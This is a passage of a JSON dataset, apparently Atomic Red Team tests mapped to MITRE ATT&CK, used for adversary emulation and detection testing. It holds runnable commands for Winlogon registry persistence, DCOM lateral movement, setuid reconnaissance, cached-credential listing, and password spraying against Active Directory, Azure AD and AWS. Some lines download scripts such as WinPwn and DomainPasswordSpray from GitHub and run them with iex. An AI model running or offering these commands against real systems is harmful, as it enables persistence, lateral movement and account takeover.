{"command": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n", "cleanup_command": "rm #{file_to_setcap}\n", "name": "sh", "elevation_required": true}}, {"name": "Do reconnaissance for files that have the setuid bit set", "auto_generated_guid": "8e36da01-cd29-45fd-be72-8a0fcaad4481", "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n", "supported_platforms": ["linux"], "executor": {"command": "find /usr/bin -perm -4000\n", "name": "sh"}}, {"name": "Do reconnaissance for files that have the setgid bit set", "auto_generated_guid": "3fb46e17-f337-4c14-9f9a-a471946533e2", "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n", "supported_platforms": ["linux"], "executor": {"command": "find /usr/bin -perm -2000\n", "name": "sh"}}]}, "T1547.004": {"name": "Winlogon Helper DLL", "technique_id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35", "external_id": "T1547.004", "data_components": ["Windows Registry Key Modification", "Module Load", "Command Execution"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.", "atomic_tests": [{"name": "Winlogon Shell Key Persistence - PowerShell", "auto_generated_guid": "bf9f9d65-ee4d-4c3e-a843-777d04f19c38", "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Winlogon Userinit Key Persistence - PowerShell", "auto_generated_guid": "fb32c935-ee2e-454b-8fa3-1c46b42e8dfb", "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Winlogon Notify Key Logon Persistence - PowerShell", "auto_generated_guid": "d40da266-e073-4e5a-bb8b-2b385023e5f9", "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of notification package to execute", "type": "path", "default": "C:\\Windows\\Temp\\atomicNotificationPackage.dll"}, "function_to_execute": {"description": "Function in notification package to execute", "type": "string", "default": "AtomicTestFunction"}}, "executor": {"command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n", "cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Winlogon HKLM Shell Key Persistence - PowerShell", "auto_generated_guid": "95a3c42f-8c88-4952-ad60-13b81d929a9d", "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Winlogon HKLM Userinit Key Persistence - PowerShell", "auto_generated_guid": "f9b8daff-8fa7-4e6a-a1a7-7c14675a545b", "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_to_execute": {"description": "Path of binary to execute", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1021.003": {"name": "Distributed Component Object Model", "technique_id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd", "external_id": "T1021.003", "data_components": ["Process Creation", "Network Connection Creation", "Module Load"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)", "atomic_tests": [{"name": "PowerShell Lateral Movement using MMC20", "auto_generated_guid": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673", "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Name of Computer", "type": "string", "default": "localhost"}}, "executor": {"command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "name": "powershell"}}, {"name": "PowerShell Lateral Movement Using Excel Application Object", "auto_generated_guid": "505f24be-1c11-4694-b614-e01ae1cd2570", "description": "Powershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n", "cleanup_command": "Remove-Item 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n"}], "input_arguments": {"computer_name": {"description": "Hostname or IP", "type": "string", "default": "localhost"}, "user": {"description": "Name of user", "type": "string", "default": "admin"}}, "executor": {"command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")\n", "name": "powershell"}}]}, "T1110.003": {"name": "Password Spraying", "technique_id": "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c", "external_id": "T1110.003", "data_components": ["User Account Authentication", "Application Log Content"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c"], "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "atomic_tests": [{"name": "Password Spray all Domain Users", "auto_generated_guid": "90bc2e54-6c84-47a5-9439-0a2a92b4b175", "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5", "supported_platforms": ["windows"], "input_arguments": {"password": {"description": "The password to try for each user in users.txt", "type": "string", "default": "Spring2020"}}, "dependencies": [{"description": "List of domain users to password spray must exits at %temp%\\users.txt\n", "prereq_command": "if not exist %temp%\\users.txt (exit /b 1)\n", "get_prereq_command": "\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n"}}, {"name": "Password Spray (DomainPasswordSpray)", "auto_generated_guid": "263ae743-515f-4786-ac7d-41ef3a0d4b2b", "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain to brute force against", "type": "string", "default": "$Env:USERDOMAIN"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n"}}, {"name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)", "auto_generated_guid": "f14d956a-5b6e-4a93-847f-0c415142f07d", "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n", "supported_platforms": ["windows"], "input_arguments": {"password": {"description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)", "type": "string", "default": "P@ssw0rd!"}, "domain": {"description": "Domain FQDN", "type": "string", "default": "$env:UserDnsDomain"}, "auth": {"description": "authentication method to choose between \"NTLM\" and \"Kerberos\"", "type": "string", "default": "NTLM"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n"}}, {"name": "Password spray all Azure AD users with a single password", "auto_generated_guid": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a", "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"password": {"description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)", "type": "string", "default": "P@ssw0rd!"}, "valid_username": {"description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>", "type": "string", "default": "bruce.wayne@contoso.com"}, "valid_password": {"description": "Valid password to authenticate as valid_username in the <valid_ms_account>", "type": "string", "default": "iamthebatman"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n"}}, {"name": "WinPwn - DomainPasswordSpray Attacks", "auto_generated_guid": "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82", "description": "DomainPasswordSpray Attacks technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords", "name": "powershell"}}, {"name": "Password Spray Invoke-DomainPasswordSpray Light", "auto_generated_guid": "b15bc9a5-a4f3-4879-9304-ea0011ace63a", "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n", "supported_platforms": ["windows"], "input_arguments": {"user_limit": {"description": "The max number of users to put in the list when running the prereq_command", "type": "integer", "default": 200}, "password": {"description": "The password to try for each user in users.txt", "type": "string", "default": "Spring2020"}}, "dependencies": [{"description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n", "prereq_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n"}}, {"name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)", "auto_generated_guid": "f3a10056-0160-4785-8744-d9bd7c12dc39", "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n", "supported_platforms": ["azure-ad"], "input_arguments": {"password": {"description": "Single password to try against the list of user accounts", "type": "string", "default": "P@ssword1"}, "user_list": {"description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)", "type": "string", "default": "$env:temp\\T1110.003UserList.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n"}}, {"name": "Password Spray using Kerbrute Tool", "auto_generated_guid": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb", "description": "Test a single password against a list of users\n", "supported_platforms": ["windows"], "input_arguments": {"domaincontroller": {"description": "Domain controller where test will be run", "type": "string", "default": "$ENV:userdnsdomain"}, "domain": {"description": "Domain where you will be testing", "type": "string", "default": "$ENV:userdomain"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"}, {"description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"}}, {"name": "AWS - Password Spray an AWS using GoAWSConsoleSpray", "auto_generated_guid": "9c10d16b-20b1-403a-8e67-50ef7117ed4e", "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"aws_account_id": {"description": "ID of the AWS account", "type": "string", "default": "XXXXXXXX"}}, "dependencies": [{"description": "Check if go is installed\n", "prereq_command": "go version\n", "get_prereq_command": "echo Install GO\n"}], "executor": {"command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n", "cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray\n", "name": "sh", "elevation_required": false}}]}, "T1003.005": {"name": "Cached Domain Credentials", "technique_id": "attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530", "external_id": "T1003.005", "data_components": ["Command Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\n\nWith SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)", "atomic_tests": [{"name": "Cached Credential Dump via Cmdkey", "auto_generated_guid": "56506854-89d6-46a3-9804-b7fde90791f9", "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmdkey /list\n"}}]}, "T1098.004": {"name": "SSH Authorized Keys", "technique_id": "attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4", "external_id": "T1098.004", "data_components": ["Process Creation", "File Modification", "Command Execution"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI\u2019s \u201cadd-metadata\u201d command an adversary may add SSH keys to a user 